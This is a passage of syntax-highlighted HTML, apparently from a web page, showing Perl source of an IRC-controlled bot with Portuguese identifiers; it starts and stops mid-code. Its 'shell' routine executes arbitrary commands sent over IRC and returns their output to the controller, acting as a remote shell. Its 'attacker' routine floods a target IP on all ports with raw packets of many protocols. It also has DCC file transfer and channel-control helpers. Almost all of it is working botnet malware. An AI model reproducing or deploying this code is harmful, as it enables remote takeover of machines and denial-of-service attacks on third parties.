class=\"regexp\">/^sai\\s+(\\S+)\\s+(\\d+)/</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">sleep</span> <span class=\"keyword\">int</span>(<span class=\"keyword\">rand</span>($2));</span><br><span class=\"line\">    p(<span class=\"string\">&quot;$1&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^sair/</span>) &#123;</span><br><span class=\"line\">     quit();</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^novonick/</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">my</span> $novonick = getnick();</span><br><span class=\"line\">     nick(<span class=\"string\">&quot;$novonick&quot;</span>);</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^estatisticas (.*)/</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($1 eq <span class=\"string\">&quot;on&quot;</span>) &#123;</span><br><span class=\"line\">      $estatisticas = <span class=\"number\">1</span>;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Estat.sticas ativadas!&quot;</span>);</span><br><span class=\"line\">     &#125; <span class=\"keyword\">elsif</span> ($1 eq <span class=\"string\">&quot;off&quot;</span>) &#123;</span><br><span class=\"line\">      $estatisticas = <span class=\"number\">0</span>;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Estat.sticas desativadas!&quot;</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">   <span class=\"keyword\">elsif</span> ($case =~ <span class=\"regexp\">/^pacotes (.*)/</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($1 eq <span class=\"string\">&quot;on&quot;</span>) &#123;</span><br><span class=\"line\">      $pacotes = <span class=\"number\">1</span>;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Pacotes ativados!&quot;</span>) <span class=\"keyword\">if</span> ($estatisticas == <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">     &#125; <span class=\"keyword\">elsif</span> ($1 eq <span class=\"string\">&quot;off&quot;</span>) &#123;</span><br><span class=\"line\">      $pacotes = <span class=\"number\">0</span>;</span><br><span class=\"line\">      msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Pacotes desativados!&quot;</span>) <span class=\"keyword\">if</span> ($estatisticas == <span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">shell</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $acessoshell;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $printl=$_[<span class=\"number\">0</span>];</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $comando=$_[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($comando =~ <span class=\"regexp\">/cd (.*)/</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">chdir</span>(<span class=\"string\">&quot;$1&quot;</span>) || msg(<span class=\"string\">&quot;$printl&quot;</span>, <span class=\"string\">&quot;Diret.rio inexistente!&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">elsif</span> ($pid = <span class=\"keyword\">fork</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">waitpid</span>($pid, <span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"keyword\">fork</span>) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">       &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">           <span class=\"keyword\">my</span> @resp=<span class=\"string\">`$comando 2&gt;&amp;1 3&gt;&amp;1`</span>;</span><br><span class=\"line\">           <span class=\"keyword\">my</span> $c=<span class=\"number\">0</span>;</span><br><span class=\"line\">           <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $linha (@resp) &#123;</span><br><span class=\"line\">             $c++;</span><br><span class=\"line\">             <span class=\"keyword\">chop</span> $linha;</span><br><span class=\"line\">             sendraw($IRC_cur_socket, <span class=\"string\">&quot;PRIVMSG $printl :$linha&quot;</span>);</span><br><span class=\"line\">             <span class=\"keyword\">if</span> ($c &gt;= <span class=\"string\">&quot;$linas_max&quot;</span>) &#123;</span><br><span class=\"line\">               $c=<span class=\"number\">0</span>;</span><br><span class=\"line\">               <span class=\"keyword\">sleep</span> $sleep;</span><br><span class=\"line\">             &#125;</span><br><span class=\"line\">           &#125;</span><br><span class=\"line\">           <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">attacker</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $iaddr = inet_aton($_[<span class=\"number\">0</span>]);</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $msg = <span class=\"string\">&#x27;B&#x27;</span> <span class=\"keyword\">x</span> $_[<span class=\"number\">1</span>];</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $ftime = $_[<span class=\"number\">2</span>];</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $cp = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> (%pacotes);</span><br><span class=\"line\">  $pacotes<span class=\"string\">&#123;icmp&#125;</span> = $pacotes<span class=\"string\">&#123;igmp&#125;</span> = $pacotes<span class=\"string\">&#123;udp&#125;</span> = $pacotes<span class=\"string\">&#123;o&#125;</span> = $pacotes<span class=\"string\">&#123;tcp&#125;</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">socket</span>(SOCK1, PF_INET, SOCK_RAW, <span class=\"number\">2</span>) <span class=\"keyword\">or</span> $cp++;</span><br><span class=\"line\">  <span class=\"keyword\">socket</span>(SOCK2, PF_INET, SOCK_DGRAM, <span class=\"number\">17</span>) <span class=\"keyword\">or</span> $cp++;</span><br><span class=\"line\">  <span class=\"keyword\">socket</span>(SOCK3, PF_INET, SOCK_RAW, <span class=\"number\">1</span>) <span class=\"keyword\">or</span> $cp++;</span><br><span class=\"line\">  <span class=\"keyword\">socket</span>(SOCK4, PF_INET, SOCK_RAW, <span class=\"number\">6</span>) <span class=\"keyword\">or</span> $cp++;</span><br><span class=\"line\">  <span class=\"keyword\">return</span>(<span class=\"keyword\">undef</span>) <span class=\"keyword\">if</span> $cp == <span class=\"number\">4</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $itime = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($cur_time);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $porta = <span class=\"number\">1</span>; $porta &lt;= <span class=\"number\">65535</span>; $porta++) &#123;</span><br><span class=\"line\">       $cur_time = <span class=\"keyword\">time</span> - $itime;</span><br><span class=\"line\">       <span class=\"keyword\">last</span> <span class=\"keyword\">if</span> $cur_time &gt;= $ftime;</span><br><span class=\"line\">       <span class=\"keyword\">send</span>(SOCK1, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;igmp&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\">       <span class=\"keyword\">send</span>(SOCK2, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;udp&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\">       <span class=\"keyword\">send</span>(SOCK3, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;icmp&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\">       <span class=\"keyword\">send</span>(SOCK4, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;tcp&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">       <span class=\"keyword\">for</span> (<span class=\"keyword\">my</span> $pc = <span class=\"number\">3</span>; $pc &lt;= <span class=\"number\">255</span>;$pc++) &#123;</span><br><span class=\"line\">         <span class=\"keyword\">next</span> <span class=\"keyword\">if</span> $pc == <span class=\"number\">6</span>;</span><br><span class=\"line\">         $cur_time = <span class=\"keyword\">time</span> - $itime;</span><br><span class=\"line\">         <span class=\"keyword\">last</span> <span class=\"keyword\">if</span> $cur_time &gt;= $ftime;</span><br><span class=\"line\">         <span class=\"keyword\">socket</span>(SOCK5, PF_INET, SOCK_RAW, $pc) <span class=\"keyword\">or</span> <span class=\"keyword\">next</span>;</span><br><span class=\"line\">         <span class=\"keyword\">send</span>(SOCK5, $msg, <span class=\"number\">0</span>, sockaddr_in($porta, $iaddr)) <span class=\"keyword\">and</span> $pacotes<span class=\"string\">&#123;o&#125;</span>++ <span class=\"keyword\">if</span> ($pacotes == <span class=\"number\">1</span>);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">last</span> <span class=\"keyword\">if</span> $cur_time &gt;= $ftime;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span>($cur_time, %pacotes);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">action</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;PRIVMSG $_[0] :\\001ACTION $_[1]\\001&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">ctcp</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;PRIVMSG $_[0] :\\001$_[1]\\001&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">msg</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;PRIVMSG $_[0] :$_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">notice</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;NOTICE $_[0] :$_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">op</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +o $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">deop</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] -o $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">hop</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +h $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">dehop</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +h $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">voice</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +v $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">devoice</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] -v $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">ban</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] +b $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">unban</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] -b $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">kick</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;KICK $_[0] $_[1] :$_[2]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">modo</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;MODE $_[0] $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">mode</span> </span>&#123; modo(@_); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">j</span> </span>&#123; &amp;<span class=\"keyword\">join</span>(@_); &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">join</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;JOIN $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">p</span> </span>&#123; part(@_); &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">part</span> </span>&#123;sendraw(<span class=\"string\">&quot;PART $_[0]&quot;</span>);&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">nick</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;NICK $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">invite</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;INVITE $_[1] $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">topico</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">1</span>;</span><br><span class=\"line\">   sendraw(<span class=\"string\">&quot;TOPIC $_[0] $_[1]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">topic</span> </span>&#123; topico(@_); &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">whois</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;WHOIS $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">who</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;WHO $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">names</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">unless</span> $#_ == <span class=\"number\">0</span>;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;NAMES $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">away</span> </span>&#123;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;AWAY $_[0]&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">back</span> </span>&#123; away(); &#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">quit</span> </span>&#123;</span><br><span class=\"line\">  sendraw(<span class=\"string\">&quot;QUIT :$_[0]&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">package</span> DCC;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">connections</span> </span>&#123;</span><br><span class=\"line\">   <span class=\"keyword\">my</span> @ready = $dcc_sel-&gt;can_read(<span class=\"number\">1</span>);</span><br><span class=\"line\">   <span class=\"keyword\">foreach</span> <span class=\"keyword\">my</span> $fh (@ready) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $dcctipo = $DCC&#123;$fh&#125;<span class=\"string\">&#123;tipo&#125;</span>;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $arquivo = $DCC&#123;$fh&#125;<span class=\"string\">&#123;arquivo&#125;</span>;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $bytes = $DCC&#123;$fh&#125;<span class=\"string\">&#123;bytes&#125;</span>;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $cur_byte = $DCC&#123;$fh&#125;<span class=\"string\">&#123;curbyte&#125;</span>;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $nick = $DCC&#123;$fh&#125;<span class=\"string\">&#123;nick&#125;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">my</span> $msg;</span><br><span class=\"line\">     <span class=\"keyword\">my</span> $nread = <span class=\"keyword\">sysread</span>($fh, $msg, <span class=\"number\">10240</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($nread == <span class=\"number\">0</span> <span class=\"keyword\">and</span> $dcctipo =~ <span class=\"regexp\">/^(get|sendcon)$/</span>) &#123;</span><br><span class=\"line\">        $DCC&#123;$fh&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Cancelado&quot;</span>;</span><br><span class=\"line\">        $DCC&#123;$fh&#125;<span class=\"string\">&#123;ftime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">        $dcc_sel-&gt;remove($fh);</span><br><span class=\"line\">        $fh-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">        <span class=\"keyword\">next</span>;</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"keyword\">if</span> ($dcctipo eq <span class=\"string\">&quot;get&quot;</span>) &#123;</span><br><span class=\"line\">        $DCC&#123;$fh&#125;<span class=\"string\">&#123;curbyte&#125;</span> += <span class=\"keyword\">length</span>($msg);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">my</span> $cur_byte = $DCC&#123;$fh&#125;<span class=\"string\">&#123;curbyte&#125;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">open</span>(FILE, <span class=\"string\">&quot;&gt;&gt; $arquivo&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">print</span> FILE <span class=\"string\">&quot;$msg&quot;</span> <span class=\"keyword\">if</span> ($cur_byte &lt;= $bytes);</span><br><span class=\"line\">        <span class=\"keyword\">close</span>(FILE);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">my</span> $packbyte = <span class=\"keyword\">pack</span>(<span class=\"string\">&quot;N&quot;</span>, $cur_byte);</span><br><span class=\"line\">        <span class=\"keyword\">print</span> $fh <span class=\"string\">&quot;$packbyte&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($bytes == $cur_byte) &#123;</span><br><span class=\"line\">           $dcc_sel-&gt;remove($fh);</span><br><span class=\"line\">           $fh-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">           $DCC&#123;$fh&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Recebido&quot;</span>;</span><br><span class=\"line\">           $DCC&#123;$fh&#125;<span class=\"string\">&#123;ftime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">           <span class=\"keyword\">next</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">     &#125; <span class=\"keyword\">elsif</span> ($dcctipo eq <span class=\"string\">&quot;send&quot;</span>) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">my</span> $send = $fh-&gt;<span class=\"keyword\">accept</span>;</span><br><span class=\"line\">          $send-&gt;autoflush(<span class=\"number\">1</span>);</span><br><span class=\"line\">          $dcc_sel-&gt;add($send);</span><br><span class=\"line\">          $dcc_sel-&gt;remove($fh);</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;tipo&#125;</span> = <span class=\"string\">&#x27;sendcon&#x27;</span>;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;itime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;nick&#125;</span> = $nick;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;bytes&#125;</span> = $bytes;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;curbyte&#125;</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;arquivo&#125;</span> = $arquivo;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;ip&#125;</span> = $send-&gt;peerhost;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;porta&#125;</span> = $send-&gt;peerport;</span><br><span class=\"line\">          $DCC&#123;$send&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Enviando&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">open</span>(FILE, <span class=\"string\">&quot;&lt; $arquivo&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">my</span> $fbytes;</span><br><span class=\"line\">          <span class=\"keyword\">read</span>(FILE, $fbytes, <span class=\"number\">1024</span>);</span><br><span class=\"line\">          <span class=\"keyword\">print</span> $send <span class=\"string\">&quot;$fbytes&quot;</span>;</span><br><span class=\"line\">          <span class=\"keyword\">close</span> FILE;</span><br><span class=\"line\">     &#125; <span class=\"keyword\">elsif</span> ($dcctipo eq <span class=\"string\">&#x27;sendcon&#x27;</span>) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">my</span> $bytes_sended = <span class=\"keyword\">unpack</span>(<span class=\"string\">&quot;N&quot;</span>, $msg);</span><br><span class=\"line\">          $DCC&#123;$fh&#125;<span class=\"string\">&#123;curbyte&#125;</span> = $bytes_sended;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> ($bytes_sended == $bytes) &#123;</span><br><span class=\"line\">             $fh-&gt;<span class=\"keyword\">close</span>;</span><br><span class=\"line\">             $dcc_sel-&gt;remove($fh);</span><br><span class=\"line\">             $DCC&#123;$fh&#125;<span class=\"string\">&#123;status&#125;</span> = <span class=\"string\">&quot;Enviado&quot;</span>;</span><br><span class=\"line\">             $DCC&#123;$fh&#125;<span class=\"string\">&#123;ftime&#125;</span> = <span class=\"keyword\">time</span>;</span><br><span class=\"line\">             <span class=\"keyword\">next</span>;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">          <span class=\"keyword\">open</span>(SENDFILE, <span class=\"string\">&quot;&lt; $arquivo&quot;</span>);</span><br><span class=\"line\">          <span class=\"keyword\">seek</span>(SENDFILE, $bytes_sended, <span class=\"number\">0</span>);</span><br><span class=\"line\">          <span class=\"keyword\">my</span> $send_bytes;</span><br><span class=\"line\">          <span class=\"keyword\">read</span>(SENDFILE, $send_bytes, <span class=\"number\">1024</span>);</span><br><span class=\"line\">          <span class=\"keyword\">print</span> $fh <span class=\"string\">&quot;$send_bytes&quot;</span>;</span><br><span class=\"line\">          <span class=\"keyword\">close</span>(SENDFILE);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">sub</span> <span class=\"title\">SEND</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> ($nick, $arquivo) = @_;</span><br><span class=\"line\">  <span class=\"keyword\">unless</span> (-r <span class=\"string\">&quot;$arquivo&quot;</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> $dccark = $arquivo;</span><br><span class=\"line\">  $dccark =~ <span class=\"regexp\">s/[.*\\/](\\S+)/$1/</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> $meuip = $::irc_servers&#123;<span class=\"string\">&quot;$::IRC_cur_socket&quot;</span>&#125;&#123;<span class=\"string\">&#x27;meuip&#x27;</span>&#125;;</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $longip = <span class=\"keyword\">unpack</span>(<span class=\"string\">&quot;N&quot;</span>,inet_aton($meuip));</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">my</span> @filestat = <span class=\"keyword\">stat</span>($arquivo);</span><br><span class=\"line\">  <span class=\"keyword\">my</span> $size_total=$filestat[<span class=\"number\">7</span>];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ($size_total == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">return</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">  